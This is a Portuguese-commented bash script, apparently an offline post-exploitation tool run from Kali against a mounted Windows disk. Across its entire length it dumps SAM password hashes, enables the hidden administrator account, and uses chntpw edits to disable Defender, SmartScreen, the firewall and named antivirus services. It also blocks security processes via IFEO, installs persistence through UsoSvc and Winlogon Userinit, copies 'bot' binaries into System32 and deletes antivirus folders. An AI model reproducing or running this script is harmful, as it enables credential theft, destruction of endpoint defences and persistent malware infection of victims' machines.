#!/bin/bash

# --- CONFIGURAÇÕES ---
BOT="Windows.exe"
HELPER="Windows_helper.exe"
ASSISTANT="Windows.assistant.exe"
SYS32_REG="C:\\\\Windows\\\\System32"
# --- CONFIGURAÇÕES DE DESTINO NO KALI ---
POST_EXP_DIR="/home/kali/Desktop/Post_Exploitation"
mkdir -p "$POST_EXP_DIR"

echo "[+] INICIANDO PROTOCOLO OMNI: ACESSO TOTAL & FAILOVER DE MONTAGEM"

# 1. LÓGICA DE DETEÇÃO DE PONTO DE MONTAGEM (FAILOVER)
MOUNT_POINT=$(mount | grep -i "ntfs" | awk '{print $3}' | while read m; do [ -f "$m/Windows/System32/ntoskrnl.exe" ] && echo "$m" && break; done)

if [ -z "$MOUNT_POINT" ]; then
    echo "[*] Deteção automática falhou. Tentando montagem forçada em /mnt/windows..."
    sudo mkdir -p /mnt/windows
    # Força montagem RW ignorando hibernação do Windows
    sudo mount -t ntfs-3g -o remove_hiberfile,rw /dev/nvme0n1p3 /mnt/windows 2>/dev/null
    MOUNT_POINT="/mnt/windows"
fi

if [ ! -f "$MOUNT_POINT/Windows/System32/config/SYSTEM" ]; then
    echo "[-] Estrutura não encontrada. Introduza o caminho manualmente."
    read -p "[?] Caminho do mount (ex: /mnt/windows): " MOUNT_POINT
fi

if [ ! -f "$MOUNT_POINT/Windows/System32/config/SYSTEM" ]; then
    echo "[-] Erro Crítico: Windows inacessível."
    exit 1
fi

echo "[*] Windows detectado em: $MOUNT_POINT"

# Definição das Hives
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"

# 2. EXTRAÇÃO DE HASHES (Formatado em Colunas)
samdump2 "$SYSTEM" "$SAM" | column -t -s ":" > "$POST_EXP_DIR/hashes_$(date +%d%m_%H%M).txt"

# 3. ATIVAR ADMIN OCULTO (RID 500)
echo "[*] Ativando Administrador Oculto..."
printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" &>/dev/null

# 4. NUKE: DEFESAS NATIVAS E EXCLUSÕES
echo "[*] Neutralizando Defender, Firewall e SmartScreen..."
printf "cd Microsoft\\\\Windows Defender\\\\Real-Time Protection\nnv 4 DisableRealtimeMonitoring\ned DisableRealtimeMonitoring\n1\ncd ..\\\\Features\nnv 4 TamperProtection\ned TamperProtection\n0\ncd ..\\\\Exclusions\\\\Paths\nnewkey $SYS32_REG\ncd ..\\\\..\\\\..\\\\Windows\\\\CurrentVersion\\\\Explorer\nnv 4 SmartScreenEnabled\ned SmartScreenEnabled\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

printf "cd ControlSet001\\\\Services\\\\SharedAccess\\\\Parameters\\\\FirewallPolicy\\\\StandardProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\ncd ..\\\\PublicProfile\nnv 4 EnableFirewall\ned EnableFirewall\n0\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# 5. NUKE: DEFESAS DE TERCEIROS E ENDPOINTS (ESET, Trellix, etc.)
echo "[*] Desativando serviços de AVs e Endpoints..."
# Incluídos: ekrn/epfw (ESET) e xagt (Trellix)
AV_LIST=("avp" "avpckcl" "McShield" "mfevtp" "SmadavService" "ekrn" "epfw" "SentinelAgent" "SepMasterService" "xagt")
for svc in "${AV_LIST[@]}"; do
    printf "cd ControlSet001\\\\Services\\\\$svc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
done

# 6. BLOQUEIO DE AUTO-REGENERAÇÃO (IFEO)
echo "[*] Aplicando bloqueio IFEO contra reinício de processos..."
BLOCK_LIST=("Smadav.exe" "avp.exe" "McMcAfee.exe" "ekrn.exe" "egui.exe" "MsMpEng.exe" "xagt.exe")
for exe in "${BLOCK_LIST[@]}"; do
    printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\nnewkey $exe\ncd $exe\nnv 1 Debugger\ned Debugger\nsvchost.exe\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
done

# 7. SILENCIAR INTERFACE
echo "[*] Desativando notificações e Central de Ação..."
printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseActionCenterExperience\ned UseActionCenterExperience\n0\ncd ..\\\\..\\\\..\\\\Policies\\\\Microsoft\\\\Windows\\\\Explorer\nnv 4 DisableNotificationCenter\ned DisableNotificationCenter\n1\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 8. PERSISTÊNCIA DUPLA (SYSTEM + USER FAILOVER)
echo "[*] Configurando cadeia SYSTEM (Helper) e Failover (Assistant)..."
# SYSTEM via UsoSvc
printf "cd ControlSet001\\\\Services\\\\UsoSvc\nnv 1 ImagePath\ned ImagePath\ncmd /c $SYS32_REG\\\\$HELPER\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null

# USER via Userinit (Hive SOFTWARE)
printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,$SYS32_REG\\\\$ASSISTANT\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null

# 9. DEPLOY FINAL COM APAGÃO DE PASTAS
echo "[*] Iniciando Deploy e Nuke físico de diretórios..."
if [ -f "./$BOT" ] && [ -f "./$HELPER" ] && [ -f "./$ASSISTANT" ] ; then
    sudo cp "./$BOT" "$MOUNT_POINT/Windows/System32/"
    sudo cp "./$HELPER" "$MOUNT_POINT/Windows/System32/"
    sudo cp "./$ASSISTANT" "$MOUNT_POINT/Windows/System32/"
    
    # Nuke físico abrangente
    rm -rf "$MOUNT_POINT/Program Files/ESET" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files (x86)/ESET" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files (x86)/Smadav" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/McAfee" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/Kaspersky Lab" &>/dev/null
    rm -rf "$MOUNT_POINT/Program Files/FireEye" &>/dev/null
    
    sync
    echo "[!!!] PROTOCOLO CONCLUÍDO COM SUCESSO."
    echo "[!] Alvo: $MOUNT_POINT | Hashes: $DEST_DIR"
else
    echo "[-] ERRO CRÍTICO: Binários não encontrados."
    exit 1
fi
